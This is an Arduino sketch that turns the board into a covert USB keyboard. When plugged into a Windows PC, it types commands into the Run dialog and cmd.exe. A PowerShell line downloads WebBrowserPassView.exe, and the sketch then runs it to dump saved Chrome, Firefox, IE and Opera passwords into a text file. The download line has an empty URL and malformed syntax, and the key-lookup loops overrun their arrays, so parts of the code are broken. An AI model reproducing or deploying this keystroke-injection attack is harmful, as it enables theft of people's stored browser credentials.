#define LEFT_CTRL   0x01
#define LEFT_SHIFT  0x02
#define LEFT_ALT    0x04
#define LEFT_GUI    0x08
#define RIGHT_CTRL  0x10
#define RIGHT_SHIFT 0x20
#define RIGHT_ALT   0x40
#define RIGHT_GUI   0x80


//Keys
#define KEY_ENTER 0x28
#define KEY_BACKSPACE 0x2A
#define KEY_TAB 0x2B
#define KEY_CAPSLOCK 0x39


uint8_t buf[8] = { 0 }; //buffer

const int ledPin = 13;


void setup()
{
   Serial.begin(9600);

   // Open Run dialog
   delay(3000); // Wait 3 seconds
   keyPress(LEFT_GUI, 0x15); // Windows keys + R
   keyRelease(); // Release the key
   delay(200);

   // Run cmd.exe
   keyString("cmd.exe"); // Enter string
   delay(500);
   keyPress(0, KEY_ENTER); // Press enter
   keyRelease(); // Release the key
   delay(500);

   // Run powershell command
   keyString("powershell (new-object System.Net.WebClient).DownloadFile(('', 'WebBrowserPassView.exe')");
   delay(500);
   keyPress(0, KEY_ENTER);
   keyRelease();
   delay(500);

   // Extract Passwords
   keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
   delay(500);
 }


void loop()
{
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
}

void keyRelease()
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);	// Release key
}

void keyString(String text) {
  char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
  int mean_dic[] = {4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29};

  char normal_sym[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', '\\', ';', '\'',  ',', '.', '/', ' '};
  int mean_normal_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38, 0x2C};

  char shift_sym[] = {'!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '\"', '<', '>', '?'};
  int mean_shift_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38};

  char temp_char;
  boolean check;

  for(int i = 0; i < text.length(); i++) {
    temp_char = text.charAt(i);
    if( ( (int) temp_char >= 97 && (int) temp_char <= 122) || ( (int) temp_char >= 65 && (int) temp_char <= 90)) {
      for(int j = 0;j<sizeof(mean_dic) - 1;j++) {
        if(temp_char == alpha[j]) {
          keyPress(0, mean_dic[j]);
          keyRelease();
          break;
        } else if(temp_char == toupper(alpha[j])) {
          keyPress(LEFT_SHIFT, mean_dic[j]);
          keyRelease();
          break;
        }
      }
    } else {
      check = false;
      for(int j = 0;j<sizeof(mean_normal_sym) - 1;j++) {
        if(temp_char == normal_sym[j]) {
          check = true;
          keyPress(0, mean_normal_sym[j]);
          keyRelease();
          break;
        }
      }
      if(check == true) continue;

      for(int j = 0;j<sizeof(mean_shift_sym) - 1;j++) {
        if(temp_char == shift_sym[j]) {
          keyPress(LEFT_SHIFT, mean_shift_sym[j]);
          keyRelease();
          break;
        }
      }

    }
  }
}

void keyPress(int mod, int key) {
  buf[0] = mod;
  buf[2] = key;
  Serial.write(buf, 8);
}
